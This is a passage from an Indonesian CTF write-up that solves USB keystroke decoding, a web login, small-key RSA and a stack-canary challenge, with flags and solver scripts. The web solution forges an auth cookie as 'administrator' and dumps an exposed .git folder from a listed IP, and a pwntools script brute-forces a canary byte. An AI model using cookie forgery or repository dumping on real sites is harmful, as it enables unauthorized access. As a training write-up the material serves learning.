    <span class="mh">0x09</span><span class="p">:[</span><span class="sh">'</span><span class="s">f</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">F</span><span class="sh">'</span><span class="p">],</span>    <span class="mh">0x0A</span><span class="p">:[</span><span class="sh">'</span><span class="s">g</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">G</span><span class="sh">'</span><span class="p">],</span>    <span class="mh">0x0B</span><span class="p">:[</span><span class="sh">'</span><span class="s">h</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">H</span><span class="sh">'</span><span class="p">],</span>    <span class="mh">0x0C</span><span class="p">:[</span><span class="sh">'</span><span class="s">i</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">I</span><span class="sh">'</span><span class="p">],</span>    <span class="mh">0x0D</span><span class="p">:[</span><span class="sh">'</span><span class="s">j</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">J</span><span class="sh">'</span><span class="p">],</span>
    <span class="mh">0x0E</span><span class="p">:[</span><span class="sh">'</span><span class="s">k</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">K</span><span class="sh">'</span><span class="p">],</span>    <span class="mh">0x0F</span><span class="p">:[</span><span class="sh">'</span><span class="s">l</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">L</span><span class="sh">'</span><span class="p">],</span>    <span class="mh">0x10</span><span class="p">:[</span><span class="sh">'</span><span class="s">m</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">M</span><span class="sh">'</span><span class="p">],</span>    <span class="mh">0x11</span><span class="p">:[</span><span class="sh">'</span><span class="s">n</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">N</span><span class="sh">'</span><span class="p">],</span>    <span class="mh">0x12</span><span class="p">:[</span><span class="sh">'</span><span class="s">o</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">O</span><span class="sh">'</span><span class="p">],</span>
    <span class="mh">0x13</span><span class="p">:[</span><span class="sh">'</span><span class="s">p</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">P</span><span class="sh">'</span><span class="p">],</span>    <span class="mh">0x14</span><span class="p">:[</span><span class="sh">'</span><span class="s">q</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Q</span><span class="sh">'</span><span class="p">],</span>    <span class="mh">0x15</span><span class="p">:[</span><span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">R</span><span class="sh">'</span><span class="p">],</span>    <span class="mh">0x16</span><span class="p">:[</span><span class="sh">'</span><span class="s">s</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">S</span><span class="sh">'</span><span class="p">],</span>    <span class="mh">0x17</span><span class="p">:[</span><span class="sh">'</span><span class="s">t</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">T</span><span class="sh">'</span><span class="p">],</span>
    <span class="mh">0x18</span><span class="p">:[</span><span class="sh">'</span><span class="s">u</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">U</span><span class="sh">'</span><span class="p">],</span>    <span class="mh">0x19</span><span class="p">:[</span><span class="sh">'</span><span class="s">v</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">V</span><span class="sh">'</span><span class="p">],</span>    <span class="mh">0x1A</span><span class="p">:[</span><span class="sh">'</span><span class="s">w</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">W</span><span class="sh">'</span><span class="p">],</span>    <span class="mh">0x1B</span><span class="p">:[</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">X</span><span class="sh">'</span><span class="p">],</span>    <span class="mh">0x1C</span><span class="p">:[</span><span class="sh">'</span><span class="s">y</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Y</span><span class="sh">'</span><span class="p">],</span>
    <span class="mh">0x1D</span><span class="p">:[</span><span class="sh">'</span><span class="s">z</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Z</span><span class="sh">'</span><span class="p">],</span>    <span class="mh">0x1E</span><span class="p">:[</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">!</span><span class="sh">'</span><span class="p">],</span>    <span class="mh">0x1F</span><span class="p">:[</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">@</span><span class="sh">'</span><span class="p">],</span>    <span class="mh">0x20</span><span class="p">:[</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">#</span><span class="sh">'</span><span class="p">],</span>    <span class="mh">0x21</span><span class="p">:[</span><span class="sh">'</span><span class="s">4</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">$</span><span class="sh">'</span><span class="p">],</span>
    <span class="mh">0x22</span><span class="p">:[</span><span class="sh">'</span><span class="s">5</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">%</span><span class="sh">'</span><span class="p">],</span>    <span class="mh">0x23</span><span class="p">:[</span><span class="sh">'</span><span class="s">6</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">^</span><span class="sh">'</span><span class="p">],</span>    <span class="mh">0x24</span><span class="p">:[</span><span class="sh">'</span><span class="s">7</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">&amp;</span><span class="sh">'</span><span class="p">],</span>    <span class="mh">0x25</span><span class="p">:[</span><span class="sh">'</span><span class="s">8</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">*</span><span class="sh">'</span><span class="p">],</span>    <span class="mh">0x26</span><span class="p">:[</span><span class="sh">'</span><span class="s">9</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">(</span><span class="sh">'</span><span class="p">],</span>
    <span class="mh">0x27</span><span class="p">:[</span><span class="sh">'</span><span class="s">0</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">)</span><span class="sh">'</span><span class="p">],</span>    <span class="mh">0x28</span><span class="p">:[</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">],</span>   <span class="mh">0x2C</span><span class="p">:[</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">],</span>    <span class="mh">0x2D</span><span class="p">:[</span><span class="sh">'</span><span class="s">-</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">_</span><span class="sh">'</span><span class="p">],</span>    <span class="mh">0x2E</span><span class="p">:[</span><span class="sh">'</span><span class="s">=</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">+</span><span class="sh">'</span><span class="p">],</span>
    <span class="mh">0x2F</span><span class="p">:[</span><span class="sh">'</span><span class="s">[</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">{</span><span class="sh">'</span><span class="p">],</span>    <span class="mh">0x30</span><span class="p">:[</span><span class="sh">'</span><span class="s">]</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">}</span><span class="sh">'</span><span class="p">],</span>    <span class="mh">0x32</span><span class="p">:[</span><span class="sh">'</span><span class="s">#</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">~</span><span class="sh">'</span><span class="p">],</span>     <span class="mh">0x33</span><span class="p">:[</span><span class="sh">'</span><span class="s">;</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">],</span>    <span class="mh">0x34</span><span class="p">:[</span><span class="sh">'</span><span class="se">\'</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'"'</span><span class="p">],</span>   
    <span class="mh">0x36</span><span class="p">:[</span><span class="sh">'</span><span class="s">,</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">&lt;</span><span class="sh">'</span><span class="p">],</span>    <span class="mh">0x37</span><span class="p">:[</span><span class="sh">'</span><span class="s">.</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">&gt;</span><span class="sh">'</span><span class="p">],</span>    <span class="mh">0x38</span><span class="p">:[</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">?</span><span class="sh">'</span><span class="p">],</span>
<span class="p">}</span>

<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">usb-data.txt</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">usb_data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>

<span class="n">usb_data</span> <span class="o">=</span> <span class="n">usb_data</span><span class="p">.</span><span class="nf">split</span><span class="p">()</span>
<span class="n">extracted_data</span> <span class="o">=</span> <span class="sh">""</span>

<span class="k">for</span> <span class="n">data</span> <span class="ow">in</span> <span class="n">usb_data</span><span class="p">:</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">)</span>
    
    <span class="n">upp</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
    <span class="n">key</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">key</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">upp</span><span class="p">:</span>
            <span class="n">extracted_data</span> <span class="o">+=</span> <span class="n">KEYBOARD_CODES</span><span class="p">[</span><span class="n">key</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">extracted_data</span> <span class="o">+=</span> <span class="n">KEYBOARD_CODES</span><span class="p">[</span><span class="n">key</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>

<span class="nf">print</span><span class="p">(</span><span class="n">extracted_data</span><span class="p">)</span>
</code></pre></div></div>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python solver_snif.py 
susah ya nyari flags nya ? ini lho flags nya : icyptiion<span class="o">{</span>Ww1r3sh4rk_n0t_only_f0r_n3tw0rks<span class="o">}</span> <span class="nb">.</span> kettemu kan 
</code></pre></div></div>

<p>Hilangkan huruf w menjadi W1r3sh4rk dan perbaiki format flag, didapatkan flag yang benar.</p>

<h3 id="flag-4">Flag</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icyption{W1r3sh4rk_n0t_only_f0r_n3tw0rks}
</code></pre></div></div>

<h2 id="any-information-on-this-website">Any Information On This Website</h2>

<p>Diberikan link menuju website, klik button LOGIN agar diarahkan ke halaman login. Cek source dengan CTRL+U. Didapatkan teks yang ter-encode base64 <code class="language-plaintext highlighter-rouge">VkhKNUlHZDFaWE4wTDJkMVpYTjBDZz09Cg==</code></p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo </span><span class="nv">VkhKNUlHZDFaWE4wTDJkMVpYTjBDZz09Cg</span><span class="o">==</span> | <span class="nb">base64</span> <span class="nt">-d</span> | <span class="nb">base64</span> <span class="nt">-d</span>
Try guest/guest
</code></pre></div></div>

<p>Login dengan credential yang didapat, lalu didapati clue selanjutnya pada konten halaman.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>it's cool that you logged in, but unfortunately we can only give the next clue to 'administrator'. :(
</code></pre></div></div>

<p>Cek cookie pada website, ditemukan cookie auth yang terdapat <code class="language-plaintext highlighter-rouge">username=guest</code> dimana merupakan credential untuk login tadi.</p>

<p>Ubah cookie guest menjadi administrator (disini saya menggunakan ekstensi <code class="language-plaintext highlighter-rouge">EditThisCookie</code> pada Chrome). Refresh halaman dan didapatkan informasi mengenai website.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Congratulations, you're the administrator!
I made this website using there tools
- php
- visual studio code
- git
- apache
</code></pre></div></div>

<p>Akses folder git pada http://180.250.135.6:8080/.git/ dan menampilkan 403 Forbidden yang mana kita tidak diberi akses menuju path tersebut.</p>

<p>Dump git dengan GitTools.</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./gitdummper.sh http://180.250.135.6:8080/.git/ out
</code></pre></div></div>

<p>Didapatkan flag pada file config.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">grep</span> <span class="nt">-r</span> <span class="s1">'icyption{.*}'</span>
.git/config:	<span class="c">#icyption{1N1_kaN_Y4Ng_kaMu_Cari_h3he}</span>
</code></pre></div></div>

<h3 id="flag-5">Flag</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icyption{1N1_kaN_Y4Ng_kaMu_Cari_h3he}
</code></pre></div></div>

<h2 id="hannah-needs-your-help">Hannah Needs Your Help</h2>

<p>Diberikan list angka desimal, hasil enkripsi per-huruf flag dengan RSA. Diketahui nilai N = 143. Karena N kecil, penulis dapat langsung mengetahui faktor prima p dan q yaitu 11 dan 13.</p>

<p>Atau dengan menggunakan factordb.com untuk mencari prima p dan q.</p>

<p>Dilakukan bruteforce nilai e dari 0-65537 karena e belum diketahui. Berikut solvernya.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python2</span>
<span class="c"># -*- coding: utf8 -*-</span>

from Crypto.Util.number import <span class="k">*</span>
import gmpy2

cipher <span class="o">=</span> <span class="o">[</span>
    118, 44, 121, 18, 129, 118, 45, 33, 7, 21, 116, 21, 13, 33, 38, 17, 49, 13, 100, 13, 17, 49, 13, 100, 13, 17, 80, 39, 80, 13, 91, 17, 50, 39, 38, 13, 5
<span class="o">]</span>

p <span class="o">=</span> 11 <span class="p">;</span> q <span class="o">=</span> 13
n <span class="o">=</span> p <span class="k">*</span> q
t <span class="o">=</span> <span class="o">(</span>p - 1<span class="o">)</span> <span class="k">*</span> <span class="o">(</span>q - 1<span class="o">)</span>

<span class="k">for </span>e <span class="k">in </span>range<span class="o">(</span>2, 0x10001<span class="o">)</span>:
    d <span class="o">=</span> gmpy2.invert<span class="o">(</span>e, t<span class="o">)</span>
    
    flag <span class="o">=</span> <span class="s1">''</span>
    <span class="k">for </span>c <span class="k">in </span>cipher:
        flag +<span class="o">=</span> chr<span class="o">(</span>pow<span class="o">(</span>c, d, n<span class="o">))</span>
    
    <span class="k">if </span>flag.startswith<span class="o">(</span><span class="s1">'icyption'</span><span class="o">)</span>:
        print <span class="s1">'Found exponent = %d'</span> % e
        print <span class="s1">'Flag = %s'</span> % flag
        <span class="nb">break</span>
</code></pre></div></div>

<p>Jalankan dan didapatkan flag.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python solver_encryption.py 
Found exponent <span class="o">=</span> 7
Flag <span class="o">=</span> icyption<span class="o">{</span>m3m4ng_r4d4_r4d4_sus4h_jug4<span class="o">}</span>
</code></pre></div></div>

<h3 id="flag-6">Flag</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icyption{m3m4ng_r4d4_r4d4_sus4h_jug4}
</code></pre></div></div>

<h2 id="canary-birds">Canary Birds</h2>

<p>Awalnya hanya diberikan service nc saja tidak ada file binary-nya sampai ada yang tanya jurinya. Akhirnya file binary-nya dibagi, dan didalamnya terdapat flag XD.</p>

<p>Tetapi disini penulis mengerjakan seperti apa yang dikatakan juri.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python <span class="nt">-c</span> <span class="s1">'print "A"*17'</span> | ./source 
saya akan mengulang perkataan ada. masukkan karakter! anda memasukkan : AAAAAAAAAAAAAAAAA

<span class="nv">$ </span>python <span class="nt">-c</span> <span class="s1">'print "A"*18'</span> | ./source 
saya akan mengulang perkataan ada. masukkan karakter! anda memasukkan : AAAAAAAAAAAAAAAAAA

<span class="nv">$ </span>python <span class="nt">-c</span> <span class="s1">'print "A"*20'</span> | ./source 
saya akan mengulang perkataan ada. masukkan karakter! ERROR! karaktermu kepanjangan!
</code></pre></div></div>

<p>Ditemukan pada saat input 20 karakter, program menampikan error. Selanjutnya dilakukan bruteforce karakter (yang dimaksud seperti canary) dan didapatkan flag ketika karakter ke-21 adalah %.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python canary.py 
<span class="o">[</span>... REDACTED ...]
<span class="o">[!]</span> Byte 34 fail :<span class="o">(</span>
<span class="o">[!]</span> Byte 35 fail :<span class="o">(</span>
<span class="o">[!]</span> Byte 36 fail :<span class="o">(</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found correct byte <span class="o">=</span> 37
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Flag <span class="o">=</span> icyption<span class="o">{</span>m4u_d4p3t_b34s1sw4<span class="o">}</span>
</code></pre></div></div>

<p>Berikut solvernya.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
</span>
<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">"</span><span class="s">warn</span><span class="sh">"</span>

<span class="k">def</span> <span class="nf">shot</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
    <span class="n">r</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="sh">'</span><span class="s">./source</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">"</span><span class="s">! </span><span class="sh">"</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">r</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
        
<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
        <span class="n">out</span> <span class="o">=</span> <span class="nf">shot</span><span class="p">(</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="mh">0x14</span> <span class="o">+</span> <span class="nf">chr</span><span class="p">(</span><span class="n">byte</span><span class="p">))</span>
        <span class="k">if</span> <span class="sh">'</span><span class="s">ERROR</span><span class="sh">'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">out</span><span class="p">:</span>
            <span class="k">print</span> <span class="sh">'</span><span class="s">[*] Found correct byte = %d</span><span class="sh">'</span> <span class="o">%</span> <span class="n">byte</span>
            <span class="k">print</span> <span class="sh">'</span><span class="s">[*] Flag = </span><span class="sh">'</span> <span class="o">+</span> <span class="n">out</span><span class="p">[</span><span class="n">out</span><span class="p">.</span><span class="nf">index</span><span class="p">(</span><span class="sh">'</span><span class="s">icyption</span><span class="sh">'</span><span class="p">):]</span>
            <span class="k">break</span>
        <span class="k">print</span> <span class="sh">'</span><span class="s">[!] Byte %d fail :(</span><span class="sh">'</span> <span class="o">%</span> <span class="n">byte</span>
</code></pre></div></div>

<h3 id="flag-7">Flag</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icyption{m4u_d4p3t_b34s1sw4}
</code></pre></div></div>

<p>Berikut hasil decompile binary menggunakan IDA.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax@2</span>
    <span class="kt">char</span> <span class="n">src</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span> <span class="c1">// [sp+10h] [bp-90h]@1</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">;</span> <span class="c1">// [sp+30h] [bp-70h]@1</span>
    <span class="kt">char</span> <span class="n">correct_byte</span><span class="p">;</span> <span class="c1">// [sp+44h] [bp-5Ch]@1</span>
    <span class="n">_BYTE</span> <span class="n">v8</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span> <span class="c1">// [sp+45h] [bp-5Bh]@3</span>

    <span class="n">setbuf</span><span class="p">(</span><span class="n">_bss_start</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="s">"icyption{m4u_d4p3t_b34s1sw4}"</span><span class="p">);</span>
    <span class="n">correct_byte</span> <span class="o">=</span> <span class="mi">37</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"saya akan mengulang perkataan ada. masukkan karakter! "</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
    <span class="n">scanf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buffer</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="mi">37</span> <span class="o">==</span> <span class="n">correct_byte</span> <span class="p">)</span>
    <span class="p">{</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">v8</span><span class="p">,</span> <span class="n">src</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"anda memasukkan : %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buffer</span><span class="p">);</span>
    <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"ERROR! karaktermu kepanjangan!"</span><span class="p">);</span>
    <span class="n">result</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Admin Mistake. Seharusnya menggunakan fungsi <code class="language-plaintext highlighter-rouge">fopen()</code> dalam C untuk mendapatkan value flag. Karena kalau seperti ini malah lebih ke-reversing kata salah satu peserta.</p>

<h2 id="penutup">Penutup</h2>

<p>Masukkan untuk juri, mohon untuk melakukan testing secara teliti pada seluruh soal. Dan saya tidak tahu apakah probset ctf ini sama, karena “Any Information On This Website” merupakan soal copy dari gemastik.</p>

<p>Alhamdulillah Semoga Menang menjadi menang beneran :).</p>

<p>:helloworld:</p>]]></content><author><name></name></author><summary type="html"><![CDATA[Ini merupakan kompetisi CTF pertama yang saya ikuti, dan ini merupakan sebuah kickstart dan abuse untuk saya bahwa saya dapat berkontribusi di bidang ini. Special thanks to bl33dz yang telah mengundang saya untuk join ke tim nya (yang sebelumnya tim ini memiliki 3 anggota, karena sudah lulus satu diganti saya wkwk).]]></summary></entry></feed>